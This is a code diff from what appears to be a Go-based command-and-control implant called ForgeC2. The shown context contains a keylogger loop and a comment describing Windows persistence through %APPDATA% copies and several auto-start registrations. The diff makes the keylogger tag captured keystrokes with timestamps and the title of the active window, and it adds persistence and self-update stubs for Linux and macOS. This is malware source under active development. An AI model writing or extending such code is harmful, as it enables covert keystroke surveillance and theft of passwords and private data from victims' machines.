@@ -343,6 +343,9 @@ func applyHideWindow(cmd *exec.Cmd) {
 	}
 }
 
+func addPersistenceLinux()  {}
+func addPersistenceDarwin() {}
+
 // addPersistenceWindows does robust user-level persistence for Windows.
 // Copies the binary to %APPDATA%\ForgeC2\forgec2.exe (stable location even if original is deleted).
 // Registers multiple auto-start methods (much stronger than single HKCU Run):
@@ -649,7 +652,17 @@ func vkToString(vk int, shift bool) string {
 func keyloggerLoop() {
 	debugLog("keylogger goroutine started")
 	var prev [256]uint16
+	lastWindow := ""
 	for keylogActive {
+		currentWindow := getActiveWindowTitle()
+		if currentWindow != lastWindow {
+			keylogMu.Lock()
+			keylogBuffer.WriteString(fmt.Sprintf("\n[%s] [%s]\n",
+				time.Now().Format("2006-01-02 15:04:05"), currentWindow))
+			keylogMu.Unlock()
+			lastWindow = currentWindow
+		}
+
 		for vk := 0; vk < 256; vk++ {
 			state := getAsyncKeyState(int32(vk))
 			// high bit set = currently down
@@ -3337,5 +3350,9 @@ func selfUpdateWindows(exe, tmpPath string) string {
 }
 
 func selfUpdateLinux(exe, tmpPath string) string {
+	return "" // stub for Windows build
+}
+
+func selfUpdateDarwin(exe, tmpPath string) string {
 	return "" // stub for Windows build
 }
